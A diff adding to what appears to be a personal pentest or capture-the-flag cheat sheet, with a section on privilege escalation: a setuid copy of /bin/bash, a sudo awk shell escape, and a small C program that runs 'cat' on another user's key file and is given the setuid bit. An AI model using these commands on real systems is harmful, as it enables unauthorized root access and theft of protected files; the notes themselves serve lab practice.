@@ -54,6 +54,18 @@ Poratble Database
 ##### sudo -u user awk 'BEGIN {system("/bin/bash")}'
 ##### sudo -u user awk {'print $1'} ~/flag.txt
 
+### Privilege Escalation with cp and chmod
+#### Copy the /bin/bash to /tmp/test
+#### chmod +xs /tmp/test && ./test
+#### $test
+#### Create following file hello :
+int main (void)
+{
+system("cat /home/victim/key.txt");
+}
+
+#### sudo -u user cp hello /tmp/test
+#### sudo -u user chmod +xs /tmp/test && ./test
 ### Create wordlist for testing opensource projects
 #### find | sed 's/\.//g' > ffufwordlist.txt
 
